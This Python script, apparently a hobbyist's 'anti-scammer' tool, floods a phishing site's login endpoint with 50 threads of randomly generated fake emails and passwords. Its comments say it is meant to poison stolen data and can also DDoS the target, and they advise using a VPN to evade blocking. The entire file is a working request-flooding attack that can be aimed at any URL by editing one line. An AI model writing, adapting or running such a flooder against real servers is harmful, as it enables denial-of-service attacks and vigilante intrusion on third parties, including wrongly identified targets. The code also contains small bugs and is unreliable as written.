# Anti-Scammer Technology
# This script was created to flood an API endpoint of someone who I found that created a fake login screen to steal victims information.
# The idea was that if there was enough fake data in their database they would not be able to find legitimate data (hopefully!)
# If you use enough threads you could also DDOS them as well (as long as your IP doesn't get blocked). I would def use a VPN while running.
# If used for evil I will find you I swear to god.

import requests
import threading
import json
import random
from os import system, name
import time
from random import choice

# Variables
threads = []
thread_count = 50 # This is how many requests we want make at a time.
random_names = []
random_nouns = []
random_passwords = []
url = "https://scammer-url/new.php"
sent_requests = 0

# Generate the API request
# The situation I came across, the endpoint only needed email and password parameters.
# You will have to adjust the payload to match yours.
def generate_request():
    while True:
        email = generate_email()
        password = generate_password()
        payload = {'email': email, 'password': password}
        send_payload(payload)

# Send the API request
def send_payload(payload):
    try:
        _ = requests.post(url, data = payload)
    except Exception:
        pass
    finally:
        increment_request_count()

# Generate a random email
def generate_email():
    email_seed = random.choice(range(1, 11))
    domain_seed = random.choice(range(1, 11))
    name = random.choice(random_names).lower()
    second_name = random.choice(random_names).lower()
    noun = random.choice(random_nouns).lower()
    domain = ""

    match domain_seed:
        case 1:
            domain = "@" + random.choice(random_nouns).lower() + ".com"
        case 2:
            domain = "@" + random.choice(random_nouns).lower() + random.choice(random_nouns).lower() + ".com"
        case 3:
            domain = "@" + random.choice(random_nouns).lower() + ".com"
        case 4:
            domain = "@" + random.choice(random_nouns).lower() + ".com"
        case 5:
            domain = "@" + random.choice(random_nouns).lower() + ".net"
        case 6:
            domain = "@" + random.choice(random_nouns).lower() + random.choice(random_nouns).lower() + ".net"
        case 7:
            domain = "@" + random.choice(random_nouns).lower() + ".cc"
        case 8:
            domain = "@" + random.choice(random_nouns).lower() + ".co.uk"
        case 9:
            domain = "@" + random.choice(random_nouns).lower() + ".us"
        case 10:
            domain = "@" + random.choice(random_nouns).lower() + ".org"

    match email_seed:
        case 1:
            return name + "." + second_name + domain
        case 2:
            return name + second_name + domain
        case 3:
            return name + "." + second_name + str(random.choice(range(10, 1000))) + domain
        case 4:
            return name + second_name + str(random.choice(range(10, 1000))) + domain
        case 5:
            return name + str(random.choice(range(10, 1000))) + domain
        case 6:
            return name + "." + noun + domain
        case 7:
            return name + noun + domain
        case 8:
            return name + "." + noun + str(random.choice(range(10, 1000))) + domain
        case 9:
            return name + noun + str(random.choice(range(10, 1000))) + domain
        case 10:
            return noun + str(random.choice(range(10, 1000))) + domain

# Generate a random password
def generate_password():
    password_seed = random.choice(range(1, 3))
    symbol_seed = random.choice(range(1, 5))
    symbol = ""
    password = random.choice(random_passwords)

    if len(password) < 8:
        password = password + random.choice(random_passwords)
    
    password.replace(" ", "")

    match symbol_seed:
        case 1:
            symbol = "!"
        case 2:
            symbol = "@"
        case 3:
            symbol = "#"
        case 4:
            symbol = "$"

    # This horrible line randomly makes characters upper or lowercase
    password = ''.join(choice((str.upper, str.lower))(c) for c in password)

    match password_seed:
        case 1:
            return password + symbol
        case 2:
            return symbol + password

# Keep track of number requests sent
def increment_request_count():
    global sent_requests
    sent_requests += 1

# Print total number of requests sent
def print_count():
    global sent_requests
    while True:
        if name == 'nt':
            _ = system('cls')
        else:
            _ = system('clear')

        print("Spamming in progress...")
        print("-----------------------")
        print("Total Requests Sent: " + str(sent_requests))
        time.sleep(0.25)

# Open data files
with open('./first-names.json') as f:
    random_names = json.load(f)

with open('./nouns.json') as f:
    random_nouns = json.load(f)

with open('./common-passwords.json') as f:
    random_passwords = json.load(f)

# Async tasks bb girl
print_thread = threading.Thread(target = print_count)
print_thread.daemon = True
threads.append(print_thread)

for i in range(thread_count):
    t = threading.Thread(target = generate_request)
    t.daemon = True
    threads.append(t)

for i in range(thread_count):
    threads[i].start()

for i in range(thread_count):
    threads[i].join()
